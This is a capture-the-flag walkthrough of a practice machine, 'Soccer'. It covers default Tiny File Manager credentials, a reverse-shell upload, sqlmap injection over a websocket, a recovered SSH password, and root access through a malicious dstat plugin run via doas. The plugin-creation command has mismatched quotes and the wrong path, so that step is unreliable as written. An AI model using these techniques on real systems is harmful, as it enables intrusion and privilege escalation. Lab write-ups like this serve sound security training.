User FLAG
-----

1. Scan target
2. Enter port 80
3. Add dns entry to /etc/hosts
4. Enumerate directories
5. Find tinyfilemanager
6. Find credentials
7. Login to tinyfilemanager
8. Upload reverse shell
9. Enumerate machine
10. Found another host from the nginx configuration
11. Explore application
12. Create an account
13. Login with that account
14. Check ticket part
15. Try server-side-template-injection (nope)
16. Try sql injection with websocket url (sqlmap)
17. Obtain DB names
18. Obtain user to SSH
19. Get user flag

## Info
There is a path /tiny which uses tinyfilemanager (found with feroxbuster)

`Credentials`
Default username/password: admin/admin@123 (found here https://github.com/prasathmani/tinyfilemanager?tab=readme-ov-file#how-to-use)

Expressjs running on new hostname (Wappalyzer)
Found this code in the source

```js
var ws = new WebSocket("ws://soc-player.soccer.htb:9091"); // We can use this later!
window.onload = function () {

var input = document.getElementById('id');

function sendText() {
    var msg = input.value;
    if (msg.length > 0) {
        ws.send(JSON.stringify({
            "id": msg // This is used as the payload
        }))
    }
    else append("????????")
}
}

ws.onmessage = function (e) {
    append(e.data)
}

function append(msg) {
    let p = document.querySelector("p");
    p.textContent = msg
}
```

As we can see the payload sends an id which is the message.
After this we can scan it with sqlmap sending an id

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --
level 5 --risk 3 --batch
```

Created `sqlmap.log`

At this point we have the db name, we can dump it with sqlmap too, and there we have ssh user to obtain user flag.

### Inside machine

```bash
ls -al /etc/nginx/sites-enabled
total 8
drwxr-xr-x 2 root root 4096 Dec  1  2022 .
drwxr-xr-x 8 root root 4096 Nov 17  2022 ..
lrwxrwxrwx 1 root root   34 Nov 17  2022 default -> /etc/nginx/sites-available/default
lrwxrwxrwx 1 root root   41 Nov 17  2022 soc-player.htb -> /etc/nginx/sites-available/soc-player.htb
```

## Versions

OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
nginx 1.18.0
Tiny File Manager 2.4.3
back-end DBMS: MySQL >= 5.0.12

## Services

xmltec-xmlmail

## Password

PlayerOftheMatch2022

Root FLAG
-----

1. Find SUID files
2. Found that doas is installed
3. Check doas configuration
4. Found that we can execute dstat as root
5. Create a plugin for dstat
6. Execute dstat with the plugin
7. Obtain root flag

```bash
find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/doas # The one we are looking for, others are not relevant
```

### What is doas?

doas is used to assume the identity of another user on the system. 

where is configuration?

Usually at `/etc/doas.conf` but in this case is at `/usr/local/etc/doas.conf`

You can find the configuration with the following command

```bash
whereis doas.conf
locate doas.conf
```

```bash
cat /usr/local/etc/doas.conf 
permit nopass player as root cmd /usr/bin/dstat
```

Knowing that we can execute the following command `/usr/bin/dstat`

We are going to research about how to use dstats to obtain a shell. For this we can use GTFOBins.

`dstat` allows you to run arbitrary python scripts loaded as “external plugins” if they are located in one of the directories stated in the `dstat` man page under “FILES”:

```shell
~/.dstat/
(path of binary)/plugins/
/usr/share/dstat/
/usr/local/share/dstat/
```

After researching with `ls -la` we found that `/usr/local/share/dstat/` exists and we can write in it.

With this simple information we can create a python script to obtain a shell with root privileges.

```bash
echo "import os; os.execv('/bin/sh', ["sh"])' > dstat_shell.py
```

```bash
doas -u root /usr/bin/dstat --shell
```

Congratulations! You have obtained root access to the machine.

## Links

- https://wiki.archlinux.org/title/Doas
- https://gtfobins.github.io/gtfobins/dstat/
- https://tinyfilemanager.github.io/
- https://github.com/sqlmapproject/sqlmap